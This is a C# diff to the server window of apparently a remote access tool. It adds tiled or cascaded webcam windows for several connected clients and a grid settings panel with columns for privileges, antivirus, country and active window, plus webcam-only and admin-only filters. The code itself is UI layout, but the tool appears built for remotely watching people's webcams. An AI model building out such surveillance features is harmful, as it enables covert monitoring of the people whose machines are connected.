@@ -154,6 +154,8 @@ public partial class ServerWindow : Window
             LoadColumnVisibility();
             RestoreGridColumnWidths();
             SetupGridColumnPersistence();
+            PopulateColumnVisibilityMenu();
+            UpdateSettingsCheckboxStates();
 
             // Initialise diagnostic logger (enabled by default)
             DiagnosticLogger.Init();
@@ -1064,24 +1066,75 @@ public partial class ServerWindow : Window
         if (clients.Count == 0 || _server == null) return;
         LogAdminAction("Remote Webcam", clients.Count, clients[0].Id);
         var server = _server;
-        var area = SystemParameters.WorkArea;
-        const int step = 28, margin = 60, winW = 700, winH = 520;
-        int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
-        int i = 0;
-        foreach (var c in clients)
+
+        // Filter to clients that actually have a camera
+        var eligible = clients.Where(c => !c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase)).ToList();
+        if (eligible.Count == 0) return;
+
+        // Determine layout mode
+        WebcamLayout layout = WebcamLayout.Cascade; // default for < 4
+        if (eligible.Count >= 4)
         {
-            if (c.CameraStatus.Equals("No", StringComparison.OrdinalIgnoreCase))
-                continue;
-            int s = (i % maxSteps) * step;
-            OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+            var result = WebcamLayoutDialog.Prompt(this);
+            if (result == null) return; // user cancelled
+            layout = result.Value;
+        }
+
+        var area = SystemParameters.WorkArea;
+
+        if (layout == WebcamLayout.Tile)
+        {
+            // Calculate grid dimensions
+            int count = eligible.Count;
+            int cols = (int)Math.Ceiling(Math.Sqrt(count));
+            int rows = (int)Math.Ceiling((double)count / cols);
+            double tileW = area.Width / cols;
+            double tileH = area.Height / rows;
+            // Enforce minimums
+            tileW = Math.Max(tileW, 420);
+            tileH = Math.Max(tileH, 320);
+
+            int i = 0;
+            foreach (var c in eligible)
             {
-                var w = new WebcamWindow(server, c.Id);
-                w.Left = area.Left + margin + s;
-                w.Top  = area.Top  + margin + s;
-                return w;
-            });
-            i++;
-            if (clients.Count > 1) await Task.Delay(80);
+                int col = i % cols;
+                int row = i / cols;
+                double left = area.Left + col * tileW;
+                double top  = area.Top  + row * tileH;
+                double w = tileW;
+                double h = tileH;
+
+                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+                {
+                    var win = new WebcamWindow(server, c.Id);
+                    win.Left   = left;
+                    win.Top    = top;
+                    win.Width  = w;
+                    win.Height = h;
+                    return win;
+                });
+                i++;
+                if (eligible.Count > 1) await Task.Delay(80);
+            }
+        }
+        else // Cascade
+        {
+            const int step = 28, margin = 60, winW = 700, winH = 520;
+            int maxSteps = Math.Max(1, (int)(Math.Min(area.Width - winW - margin, area.Height - winH - margin) / step));
+            int i = 0;
+            foreach (var c in eligible)
+            {
+                int s = (i % maxSteps) * step;
+                OpenFeatureWindow<WebcamWindow>(c.Id, () =>
+                {
+                    var w = new WebcamWindow(server, c.Id);
+                    w.Left = area.Left + margin + s;
+                    w.Top  = area.Top  + margin + s;
+                    return w;
+                });
+                i++;
+                if (eligible.Count > 1) await Task.Delay(80);
+            }
         }
     }
 
@@ -4897,98 +4950,132 @@ Read-Host 'Press Enter to close'
         }
     }
 
-    private void BtnGridSettings_Click(object sender, RoutedEventArgs e)
+    private void PopulateColumnVisibilityMenu()
     {
-        var btn = (System.Windows.Controls.Button)sender;
-        var menu = new System.Windows.Controls.ContextMenu();
-
-        // 1. Columns Visibility Submenu
-        var visItem = new System.Windows.Controls.MenuItem { Header = "Columns Visibility" };
-        visItem.Icon = new TextBlock { Text = "👁", FontSize = 12 };
+        if (StackColumnCheckboxes == null) return;
+        StackColumnCheckboxes.Children.Clear();
         foreach (var col in GridClients.Columns)
         {
             string header = col.Header?.ToString() ?? "";
             if (string.IsNullOrEmpty(header)) continue;
 
-            var colCheck = new System.Windows.Controls.MenuItem
+            var cb = new System.Windows.Controls.CheckBox
             {
-                Header = header,
-                IsCheckable = true,
+                Content = GetFriendlyColumnHeader(header),
+                Style = (Style)FindResource("SettingsChk"),
                 IsChecked = col.Visibility == Visibility.Visible,
-                StaysOpenOnClick = true
+                Tag = col,
+                Margin = new Thickness(0, 0, 0, 8)
             };
-            colCheck.Click += (s, ev) =>
+            
+            string h = header;
+            cb.Checked += (s, ev) =>
             {
-                col.Visibility = colCheck.IsChecked ? Visibility.Visible : Visibility.Collapsed;
-                UiPrefs.Set($"ColVis_{header}", colCheck.IsChecked ? 1 : 0);
+                col.Visibility = Visibility.Visible;
+                UiPrefs.Set($"ColVis_{h}", 1);
             };
-            visItem.Items.Add(colCheck);
+            cb.Unchecked += (s, ev) =>
+            {
+                col.Visibility = Visibility.Collapsed;
+                UiPrefs.Set($"ColVis_{h}", 0);
+            };
+            
+            StackColumnCheckboxes.Children.Add(cb);
         }
-        menu.Items.Add(visItem);
+    }
 
-        menu.Items.Add(new System.Windows.Controls.Separator());
+    private string GetFriendlyColumnHeader(string header)
+    {
+        return header switch
+        {
+            "USER" => "User",
+            "PRIV" => "Privileges",
+            "COUNTRY" => "Country",
+            "MACHINE" => "Machine",
+            "AV" => "Antivirus",
+            "CAM" => "Webcam Icon",
+            "WINDOW" => "Active Window",
+            _ => header
+        };
+    }
 
-        // 2. Webcam Only
-        var webcamCheck = new System.Windows.Controls.MenuItem
+    private void UpdateSettingsCheckboxStates()
+    {
+        if (StackColumnCheckboxes == null) return;
+        foreach (var child in StackColumnCheckboxes.Children)
         {
-            Header = "📷  Webcam Only",
-            IsCheckable = true,
-            IsChecked = _webcamFilterOnly,
-            StaysOpenOnClick = true
-        };
-        webcamCheck.Click += (s, ev) =>
-        {
-            _webcamFilterOnly = webcamCheck.IsChecked;
-            RefreshClientFilters();
-        };
-        menu.Items.Add(webcamCheck);
-
-        // 3. Admin Only
-        var adminCheck = new System.Windows.Controls.MenuItem
-        {
-            Header = "⚡  Admin Only",
-            IsCheckable = true,
-            IsChecked = _adminFilterOnly,
-            StaysOpenOnClick = true
-        };
-        adminCheck.Click += (s, ev) =>
-        {
-            _adminFilterOnly = adminCheck.IsChecked;
-            RefreshClientFilters();
-        };
-        menu.Items.Add(adminCheck);
-
-        menu.Items.Add(new System.Windows.Controls.Separator());
-
-        // 4. Reset Filters
-        var resetItem = new System.Windows.Controls.MenuItem
-        {
-            Header = "Reset Filters to Default",
-            Icon = new TextBlock { Text = "🔄", FontSize = 12 }
-        };
-        resetItem.Click += (s, ev) =>
-        {
-            _webcamFilterOnly = false;
-            _adminFilterOnly = false;
-            if (TxtSearch != null) TxtSearch.Text = "";
-            
-            foreach (var col in GridClients.Columns)
+            if (child is System.Windows.Controls.CheckBox cb && cb.Tag is System.Windows.Controls.DataGridColumn col)
             {
-                string headerName = col.Header?.ToString() ?? "";
-                if (!string.IsNullOrEmpty(headerName))
-                {
-                    col.Visibility = Visibility.Visible;
-                    UiPrefs.Set($"ColVis_{headerName}", 1);
-                }
+                cb.IsChecked = col.Visibility == Visibility.Visible;
             }
-            
-            RefreshClientFilters();
-        };
-        menu.Items.Add(resetItem);
+        }
+        
+        if (ChkFilterWebcam != null) ChkFilterWebcam.IsChecked = _webcamFilterOnly;
+        if (ChkFilterAdmin != null) ChkFilterAdmin.IsChecked = _adminFilterOnly;
+    }
 
-        menu.PlacementTarget = btn;
-        menu.Placement = System.Windows.Controls.Primitives.PlacementMode.Bottom;
-        menu.IsOpen = true;
+    private void BtnGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        if (GridSettingsPanel == null) return;
+        if (GridSettingsPanel.Visibility == Visibility.Visible)
+        {
+            GridSettingsPanel.Visibility = Visibility.Collapsed;
+        }
+        else
+        {
+            UpdateSettingsCheckboxStates();
+            GridSettingsPanel.Visibility = Visibility.Visible;
+        }
+    }
+
+    private void CloseGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        if (GridSettingsPanel != null)
+            GridSettingsPanel.Visibility = Visibility.Collapsed;
+    }
+
+    private void ChkFilterWebcam_Checked(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = true;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterWebcam_Unchecked(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = false;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterAdmin_Checked(object sender, RoutedEventArgs e)
+    {
+        _adminFilterOnly = true;
+        RefreshClientFilters();
+    }
+
+    private void ChkFilterAdmin_Unchecked(object sender, RoutedEventArgs e)
+    {
+        _adminFilterOnly = false;
+        RefreshClientFilters();
+    }
+
+    private void ResetGridSettings_Click(object sender, RoutedEventArgs e)
+    {
+        _webcamFilterOnly = false;
+        _adminFilterOnly = false;
+        if (TxtSearch != null) TxtSearch.Text = "";
+        
+        foreach (var col in GridClients.Columns)
+        {
+            string headerName = col.Header?.ToString() ?? "";
+            if (!string.IsNullOrEmpty(headerName))
+            {
+                col.Visibility = Visibility.Visible;
+                UiPrefs.Set($"ColVis_{headerName}", 1);
+            }
+        }
+        
+        UpdateSettingsCheckboxStates();
+        RefreshClientFilters();
     }
 
     private void RefreshClientFilters()
